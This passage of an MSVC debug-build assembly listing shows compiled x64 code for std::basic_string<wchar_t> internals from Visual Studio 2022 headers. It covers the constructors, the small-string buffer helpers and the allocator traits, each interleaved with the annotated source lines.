  00030	48 8b d0	 mov	 rdx, rax
  00033	48 8d 8d c4 00
	00 00		 lea	 rcx, QWORD PTR $T1[rbp]
  0003a	e8 00 00 00 00	 call	 ?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
  0003f	48 8b 8d 20 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00046	4c 8b c0	 mov	 r8, rax
  00049	0f b6 95 e4 00
	00 00		 movzx	 edx, BYTE PTR $T2[rbp]
  00050	e8 00 00 00 00	 call	 ??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >

; 2509 :         _Construct<_Construct_strategy::_From_string>(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  00055	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  0005c	48 8b c8	 mov	 rcx, rax
  0005f	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  00064	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  0006b	4c 8b 41 10	 mov	 r8, QWORD PTR [rcx+16]
  0006f	48 8b d0	 mov	 rdx, rax
  00072	48 8b 8d 20 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00079	e8 00 00 00 00	 call	 ??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>

; 2510 :     }

  0007e	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00085	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0008c	5f		 pop	 rdi
  0008d	5d		 pop	 rbp
  0008e	c3		 ret	 0
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
_TEXT	SEGMENT
$T1 = 196
this$ = 256
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2499 :     basic_string() noexcept(is_nothrow_default_constructible_v<_Alty>) : _Mypair(_Zero_then_variadic_args_t{}) {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 95 c4 00
	00 00		 movzx	 edx, BYTE PTR $T1[rbp]
  0002d	48 8b c8	 mov	 rcx, rax
  00030	e8 00 00 00 00	 call	 ??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>

; 2500 :         _Construct_empty();

  00035	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty

; 2501 :     }

  00041	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0001a	48 8b c8	 mov	 rcx, rax
  0001d	e8 00 00 00 00	 call	 ??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
  00022	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00029	5f		 pop	 rdi
  0002a	5d		 pop	 rbp
  0002b	c3		 ret	 0
??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 224
?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf, COMDAT

; 2291 :         _CONSTEXPR20 void _Switch_to_buf() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2292 :             _STD _Destroy_in_place(_Ptr);

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z ; std::_Destroy_in_place<wchar_t *>

; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }

  0002e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00035	5f		 pop	 rdi
  00036	5d		 pop	 rbp
  00037	c3		 ret	 0
?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty, COMDAT

; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty, COMDAT

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b bd e0 00
	00 00		 mov	 rdi, QWORD PTR this$[rbp]
  0002d	33 c0		 xor	 eax, eax
  0002f	b9 10 00 00 00	 mov	 ecx, 16
  00034	f3 aa		 rep stosb
  00036	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003d	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00044	5f		 pop	 rdi
  00045	5d		 pop	 rbp
  00046	c3		 ret	 0
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 224
?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer, COMDAT

; 2247 :     _CONSTEXPR20 void _Activate_SSO_buffer() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2248 :         // start the lifetime of the array elements
; 2249 : #if _HAS_CXX20
; 2250 :         if (_STD is_constant_evaluated()) {
; 2251 :             for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2252 :                 _Bx._Buf[_Idx] = value_type();
; 2253 :             }
; 2254 :         }
; 2255 : #endif // _HAS_CXX20
; 2256 :     }

  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ
_TEXT	SEGMENT
tv66 = 192
this$ = 240
?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged, COMDAT

; 2243 :     _NODISCARD _CONSTEXPR20 bool _Large_mode_engaged() const noexcept {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2244 :         return _Myres > _Small_string_capacity;

  0001f	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 83 78 18 07	 cmp	 QWORD PTR [rax+24], 7
  0002b	76 0c		 jbe	 SHORT $LN3@Large_mode
  0002d	c7 85 c0 00 00
	00 01 00 00 00	 mov	 DWORD PTR tv66[rbp], 1
  00037	eb 0a		 jmp	 SHORT $LN4@Large_mode
$LN3@Large_mode:
  00039	c7 85 c0 00 00
	00 00 00 00 00	 mov	 DWORD PTR tv66[rbp], 0
$LN4@Large_mode:
  00043	0f b6 85 c0 00
	00 00		 movzx	 eax, BYTE PTR tv66[rbp]

; 2245 :     }

  0004a	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00051	5f		 pop	 rdi
  00052	5d		 pop	 rbp
  00053	c3		 ret	 0
?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ
_TEXT	SEGMENT
_Result$ = 8
this$ = 256
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr, COMDAT

; 2234 :     _NODISCARD _CONSTEXPR20 const value_type* _Myptr() const noexcept {

$LN4:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2235 :         const value_type* _Result = _Bx._Buf;

  0001f	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 89 45 08	 mov	 QWORD PTR _Result$[rbp], rax

; 2236 :         if (_Large_mode_engaged()) {

  0002a	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00031	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
  00036	0f b6 c0	 movzx	 eax, al
  00039	85 c0		 test	 eax, eax
  0003b	74 13		 je	 SHORT $LN2@Myptr

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  0003d	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8b 08	 mov	 rcx, QWORD PTR [rax]
  00047	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  0004c	48 89 45 08	 mov	 QWORD PTR _Result$[rbp], rax
$LN2@Myptr:

; 2238 :         }
; 2239 : 
; 2240 :         return _Result;

  00050	48 8b 45 08	 mov	 rax, QWORD PTR _Result$[rbp]

; 2241 :     }

  00054	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0005b	5f		 pop	 rdi
  0005c	5d		 pop	 rbp
  0005d	c3		 ret	 0
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ
_TEXT	SEGMENT
_Result$ = 8
this$ = 256
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr, COMDAT

; 2225 :     _NODISCARD _CONSTEXPR20 value_type* _Myptr() noexcept {

$LN4:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2226 :         value_type* _Result = _Bx._Buf;

  0001f	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 89 45 08	 mov	 QWORD PTR _Result$[rbp], rax

; 2227 :         if (_Large_mode_engaged()) {

  0002a	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00031	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
  00036	0f b6 c0	 movzx	 eax, al
  00039	85 c0		 test	 eax, eax
  0003b	74 13		 je	 SHORT $LN2@Myptr

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  0003d	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8b 08	 mov	 rcx, QWORD PTR [rax]
  00047	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  0004c	48 89 45 08	 mov	 QWORD PTR _Result$[rbp], rax
$LN2@Myptr:

; 2229 :         }
; 2230 : 
; 2231 :         return _Result;

  00050	48 8b 45 08	 mov	 rax, QWORD PTR _Result$[rbp]

; 2232 :     }

  00054	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0005b	5f		 pop	 rdi
  0005c	5d		 pop	 rbp
  0005d	c3		 ret	 0
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >, COMDAT

; 2212 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty

; 2213 : 
; 2214 :     // length of internal buffer, [1, 16] (NB: used by the debugger visualizer)
; 2215 :     static constexpr size_type _BUF_SIZE = 16 / sizeof(value_type) < 1 ? 1 : 16 / sizeof(value_type);
; 2216 :     // roundup mask for allocated buffers, [0, 15]
; 2217 :     static constexpr size_type _Alloc_mask = sizeof(value_type) <= 1 ? 15
; 2218 :                                            : sizeof(value_type) <= 2 ? 7
; 2219 :                                            : sizeof(value_type) <= 4 ? 3
; 2220 :                                            : sizeof(value_type) <= 8 ? 1
; 2221 :                                                                      : 0;
; 2222 :     // capacity in small mode
; 2223 :     static constexpr size_type _Small_string_capacity = _BUF_SIZE - 1;
; 2224 : 
; 2225 :     _NODISCARD _CONSTEXPR20 value_type* _Myptr() noexcept {
; 2226 :         value_type* _Result = _Bx._Buf;
; 2227 :         if (_Large_mode_engaged()) {
; 2228 :             _Result = _Unfancy(_Bx._Ptr);
; 2229 :         }
; 2230 : 
; 2231 :         return _Result;
; 2232 :     }
; 2233 : 
; 2234 :     _NODISCARD _CONSTEXPR20 const value_type* _Myptr() const noexcept {
; 2235 :         const value_type* _Result = _Bx._Buf;
; 2236 :         if (_Large_mode_engaged()) {
; 2237 :             _Result = _Unfancy(_Bx._Ptr);
; 2238 :         }
; 2239 : 
; 2240 :         return _Result;
; 2241 :     }
; 2242 : 
; 2243 :     _NODISCARD _CONSTEXPR20 bool _Large_mode_engaged() const noexcept {
; 2244 :         return _Myres > _Small_string_capacity;
; 2245 :     }
; 2246 : 
; 2247 :     _CONSTEXPR20 void _Activate_SSO_buffer() noexcept {
; 2248 :         // start the lifetime of the array elements
; 2249 : #if _HAS_CXX20
; 2250 :         if (_STD is_constant_evaluated()) {
; 2251 :             for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2252 :                 _Bx._Buf[_Idx] = value_type();
; 2253 :             }
; 2254 :         }
; 2255 : #endif // _HAS_CXX20
; 2256 :     }
; 2257 : 
; 2258 :     _CONSTEXPR20 void _Check_offset(const size_type _Off) const {
; 2259 :         // checks whether _Off is in the bounds of [0, size()]
; 2260 :         if (_Mysize < _Off) {
; 2261 :             _Xran();
; 2262 :         }
; 2263 :     }
; 2264 : 
; 2265 :     _CONSTEXPR20 void _Check_offset_exclusive(const size_type _Off) const {
; 2266 :         // checks whether _Off is in the bounds of [0, size())
; 2267 :         if (_Mysize <= _Off) {
; 2268 :             _Xran();
; 2269 :         }
; 2270 :     }
; 2271 : 
; 2272 :     [[noreturn]] static void _Xran() {
; 2273 :         _Xout_of_range("invalid string position");
; 2274 :     }
; 2275 : 
; 2276 :     _NODISCARD _CONSTEXPR20 size_type _Clamp_suffix_size(const size_type _Off, const size_type _Size) const noexcept {
; 2277 :         // trims _Size to the longest it can be assuming a string at/after _Off
; 2278 :         return (_STD min)(_Size, _Mysize - _Off);
; 2279 :     }
; 2280 : 
; 2281 :     union _Bxty { // storage for small buffer or pointer to larger one
; 2282 :         // This constructor previously initialized _Ptr. Don't rely on the new behavior without
; 2283 :         // renaming `_String_val` (and fixing the visualizer).
; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers
; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers
; 2286 : 
; 2287 :         value_type _Buf[_BUF_SIZE];
; 2288 :         pointer _Ptr;
; 2289 :         char _Alias[_BUF_SIZE]; // TRANSITION, ABI: _Alias is preserved for binary compatibility (especially /clr)
; 2290 : 
; 2291 :         _CONSTEXPR20 void _Switch_to_buf() noexcept {
; 2292 :             _STD _Destroy_in_place(_Ptr);
; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }
; 2303 :     };
; 2304 :     _Bxty _Bx;
; 2305 : 
; 2306 :     // invariant: _Myres >= _Mysize, and _Myres >= _Small_string_capacity (after string's construction)
; 2307 :     // neither _Mysize nor _Myres takes account of the extra null terminator
; 2308 :     size_type _Mysize = 0; // current length of string (size)

  0002e	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00035	48 c7 40 10 00
	00 00 00	 mov	 QWORD PTR [rax+16], 0

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

  0003d	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 c7 40 18 00
	00 00 00	 mov	 QWORD PTR [rax+24], 0

; 2212 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

  0004c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00053	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005a	5f		 pop	 rdi
  0005b	5d		 pop	 rbp
  0005c	c3		 ret	 0
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z
_TEXT	SEGMENT
__$ReturnUdt$ = 224
_Al$ = 232
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction, COMDAT

; 744  :     _NODISCARD static _CONSTEXPR20 _Alloc select_on_container_copy_construction(const _Alloc& _Al) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 745  :         return _Al;

  00024	48 8b 85 e0 00
